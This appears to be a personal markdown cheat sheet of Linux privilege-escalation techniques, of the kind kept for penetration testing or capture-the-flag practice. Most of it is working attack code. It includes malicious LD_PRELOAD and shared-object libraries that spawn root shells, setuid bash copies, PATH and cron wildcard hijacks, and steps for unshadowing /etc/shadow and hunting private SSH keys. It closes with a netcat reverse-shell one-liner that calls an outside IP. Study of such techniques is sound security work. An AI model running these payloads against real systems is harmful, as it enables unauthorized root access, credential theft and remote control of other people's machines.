 great reference:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

# Kernal exploits

https://github.com/lucyoa/kernel-exploits

dirtycow is a common one

# Passwords and file permissions 


```
history
cat ~/.bash_history
```

do we have access to files we should'nt 

/etc/passwd
/etc/shadow

if you have access to both,
```
unshadow passwd shadow > unshadowed

delete unwanted hashes
```

to identify hash types:
https://hashcat.net/wiki/doku.php?id=example_hashes

### SSH keys

hunt for authorized_keys or id_rsa

authorized_keys store the public key
id_rsa stores the private key

# sudo

https://gtfobins.github.io/

if its not in gtfo, try google

## ld_preload

also known as preloading.(ld is the dynamic linker)
we are going to be preloading a user specific library before other libraries are loaded.

making a malicious library
```
shell.c:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```
fPIC - position independant code
```
sudo LD_PRELOAD=shell.so <something that we can run as root>
```
shell.so needs to be the full path

## exploits

https://www.exploit-db.com/exploits/47502 - sudo security bypass versions < 1.8.28

https://github.com/saleemrashid/sudo-cve-2019-18634 - sudo buffer overflow < 1.8.26

https://github.com/worawit/CVE-2021-3156 - heap based overflow


# SUID

finding suid bits
```
find / -perm -u=s -type f 2>/dev/null
```


## Shared Object Injection

```
	find / -type f -perm -04000 -ls 2>/dev/null

strace <binary>

strace bin | grep -i -E "open|access|no such file"
```
look for 'no such file or directory'

if we have a read write access to one of those folders
we can make a malicious payload that gets executed

```
 nano libcalc.c

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

```


```
gcc -shared -fPIC -o /home/user/.....
```

look in ld_preload for explanation

## binary symlinks

https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

switch to www-data

identifying:
```
./tools/linux-exploit-suugestor.sh

it shows the vuln

dpkg -l | grep nginx 
ver <=1.6.2 
```
takes advantage of suid set on sudo

log files are in /var/log/nginx

using symlinks to replace the logfiles with malicious files.

```
./nginx-root.sh /var/log/nginx/error.log
```
needs nginx to restart

# environmental variables

```
echo 'int main(){setuid(0);setgid(0); system("/bin/bash"); return 0;}' > /tmp/service.c

gcc /tmp/service.c /tmp/service

export PATH=/tmp:$PATH
```
now if theres a command thats running service.

then its gonna run our binary first.

```
function /usr/bin/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p}

export -f /usr/sbin/service (-f refers to shell functionas)
```

# capabalities

Linux Privilege Escalation using Capabilities - [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

SUID vs Capabilities - [https://mn3m.info/posts/suid-vs-capabilities/](https://mn3m.info/posts/suid-vs-capabilities/)

Linux Capabilities Privilege Escalation - [https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)


hunting for capabilties
```
getcap -r / 2>/dev/null
```

run the binary and spawn a shell, you're root

python
perl
openssl
tar
etc.

# Scheduled tasks

cronjobs and systemd timer 

check for cronjobs
```
cat /etc/crontab
(theres more look at payloadallthethings)

systemctl list-timers --all
```

escalation via cron paths:

```
looking at path, we see /home/user first.

overwrite.sh doesn't have a full path so it searches the path.

we can make our own overwrite.sh

cp /bin/bash /tmp/bash; chmod +s /tmp/bash

wait a minute
/tmp/bash -p
```

escalation via wildcards:

```
we can see /local/bin/compress.sh

its doing a backup with a wildcard
same payload as last time

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh

/tmp/bash
```

cron file overwrites

```
if we can overwrite crontab scripts

you can make it into a reverse shell
or
the cp /bin/bash payload
```

# reverse shell

```
```'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.17.12.115 1111 >/tmp/f'```